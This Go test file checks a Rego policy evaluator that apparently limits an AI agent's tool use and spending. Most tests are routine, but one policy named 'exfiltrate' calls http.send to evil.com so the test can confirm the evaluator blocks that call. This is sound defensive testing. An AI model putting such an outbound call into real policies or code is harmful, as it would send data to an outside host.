package rego

import (
	"encoding/json"
	"testing"
)

func TestEvaluate_EmptyPolicies(t *testing.T) {
	results, err := Evaluate(nil, []byte(`{}`))
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if len(results) != 0 {
		t.Errorf("Expected 0 results, got %d", len(results))
	}
}

func TestEvaluate_PassingPolicy(t *testing.T) {
	pol := Policy{
		Name: "allow-all",
		Module: `package aflock
deny = []`,
	}
	input := []byte(`{"tool": "Read", "cost": 0.5}`)
	results, err := Evaluate([]Policy{pol}, input)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if len(results) != 1 {
		t.Fatalf("Expected 1 result, got %d", len(results))
	}
	if !results[0].Passed {
		t.Errorf("Expected pass, got deny: %v", results[0].Reasons)
	}
}

func TestEvaluate_DenyingPolicy(t *testing.T) {
	pol := Policy{
		Name: "deny-expensive",
		Module: `package aflock

deny[msg] {
  input.cost > 5.0
  msg := sprintf("Cost $%.2f exceeds $5.00", [input.cost])
}`,
	}
	input := []byte(`{"tool": "Read", "cost": 10.5}`)
	results, err := Evaluate([]Policy{pol}, input)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if len(results) != 1 {
		t.Fatalf("Expected 1 result, got %d", len(results))
	}
	if results[0].Passed {
		t.Error("Expected deny, got pass")
	}
	if len(results[0].Reasons) == 0 {
		t.Error("Expected at least one deny reason")
	}
}

func TestEvaluate_MultiplePolicies(t *testing.T) {
	policies := []Policy{
		{
			Name: "check-tool",
			Module: `package check_tool
deny[msg] {
  input.tool == "Bash"
  msg := "Bash is not allowed"
}`,
		},
		{
			Name: "check-cost",
			Module: `package check_cost
deny[msg] {
  input.cost > 100
  msg := "Cost too high"
}`,
		},
	}
	input := []byte(`{"tool": "Bash", "cost": 200}`)
	results, err := Evaluate(policies, input)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if len(results) != 2 {
		t.Fatalf("Expected 2 results, got %d", len(results))
	}
	// Both should fail
	if results[0].Passed {
		t.Error("check-tool should fail")
	}
	if results[1].Passed {
		t.Error("check-cost should fail")
	}
}

func TestEvaluate_CumulativeSpendCheck(t *testing.T) {
	// Simulate the paper's cumulative spend check
	pol := Policy{
		Name: "cumulative-spend",
		Module: `package aflock

import future.keywords.in

deny[msg] {
  sum_spend := sum([a.costUSD | some a in input.attestations])
  sum_spend > input.policy.maxSpendUSD
  msg := sprintf("Spend $%.2f exceeds limit $%.2f", [sum_spend, input.policy.maxSpendUSD])
}`,
	}

	input := map[string]any{
		"policy": map[string]any{
			"maxSpendUSD": 5.0,
		},
		"attestations": []map[string]any{
			{"costUSD": 1.5, "tool": "Read"},
			{"costUSD": 2.0, "tool": "Edit"},
			{"costUSD": 3.0, "tool": "Bash"},
		},
	}

	inputJSON, _ := json.Marshal(input)
	results, err := Evaluate([]Policy{pol}, inputJSON)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if results[0].Passed {
		t.Error("Expected deny: total spend $6.50 > $5.00")
	}
	if len(results[0].Reasons) == 0 {
		t.Error("Expected deny reason")
	}
	t.Logf("Deny reason: %s", results[0].Reasons[0])
}

func TestEvaluate_CumulativeSpendCheck_UnderLimit(t *testing.T) {
	pol := Policy{
		Name: "cumulative-spend",
		Module: `package aflock

import future.keywords.in

deny[msg] {
  sum_spend := sum([a.costUSD | some a in input.attestations])
  sum_spend > input.policy.maxSpendUSD
  msg := sprintf("Spend $%.2f exceeds limit $%.2f", [sum_spend, input.policy.maxSpendUSD])
}`,
	}

	input := map[string]any{
		"policy": map[string]any{
			"maxSpendUSD": 10.0,
		},
		"attestations": []map[string]any{
			{"costUSD": 1.5},
			{"costUSD": 2.0},
		},
	}

	inputJSON, _ := json.Marshal(input)
	results, err := Evaluate([]Policy{pol}, inputJSON)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if !results[0].Passed {
		t.Errorf("Expected pass: total spend $3.50 < $10.00, got deny: %v", results[0].Reasons)
	}
}

func TestEvaluate_InvalidRegoSyntax(t *testing.T) {
	pol := Policy{
		Name:   "bad-syntax",
		Module: `package aflock {{{ this is not valid rego`,
	}
	_, err := Evaluate([]Policy{pol}, []byte(`{}`))
	if err == nil {
		t.Fatal("Expected error for invalid Rego syntax")
	}
}

func TestEvaluate_MissingDenyRule(t *testing.T) {
	pol := Policy{
		Name: "no-deny",
		Module: `package aflock
allow = true`,
	}
	_, err := Evaluate([]Policy{pol}, []byte(`{}`))
	if err == nil {
		t.Fatal("Expected error for missing deny rule")
	}
}

func TestEvaluate_BlockedBuiltin_HttpSend(t *testing.T) {
	pol := Policy{
		Name: "exfiltrate",
		Module: `package aflock
deny[msg] {
  resp := http.send({"method": "GET", "url": "http://evil.com"})
  msg := "should not reach here"
}`,
	}
	_, err := Evaluate([]Policy{pol}, []byte(`{}`))
	if err == nil {
		t.Fatal("Expected error for blocked http.send builtin")
	}
}

func TestEvaluate_InvalidInputJSON(t *testing.T) {
	pol := Policy{
		Name:   "test",
		Module: `package aflock; deny = []`,
	}
	_, err := Evaluate([]Policy{pol}, []byte(`not json`))
	if err == nil {
		t.Fatal("Expected error for invalid JSON input")
	}
}

func TestEvaluate_NumberPrecision(t *testing.T) {
	// Verify that json.Number is used (not float64) so large numbers don't lose precision
	pol := Policy{
		Name: "check-precision",
		Module: `package aflock
deny[msg] {
  input.tokens > 999999999999
  msg := "too many tokens"
}`,
	}
	input := []byte(`{"tokens": 1000000000000}`)
	results, err := Evaluate([]Policy{pol}, input)
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if results[0].Passed {
		t.Error("Expected deny for large number comparison")
	}
}
